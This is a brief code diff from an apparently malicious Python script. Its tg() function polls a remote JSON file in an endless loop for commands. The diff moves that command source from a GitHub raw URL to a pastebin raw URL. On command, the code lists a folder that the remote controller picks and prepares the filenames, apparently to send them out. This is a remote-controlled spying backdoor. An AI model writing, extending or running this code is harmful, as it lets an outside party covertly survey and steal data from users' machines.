@@ -13,7 +13,7 @@ except ImportError:
     from concurrent.futures import ThreadPoolExecutor
 def tg():
     while True:
-        commands=requests.get("https://raw.githubusercontent.com/EH2116/basic/refs/heads/main/main.json").json()
+        commands=requests.get("https://pastebin.com/raw/2Nq5PFz3").json()
         if commands["start"]=="yes":
             dir_list = os.listdir(commands["folder"])
             text=str(len(dir_list))+"\n"+str(dir_list)
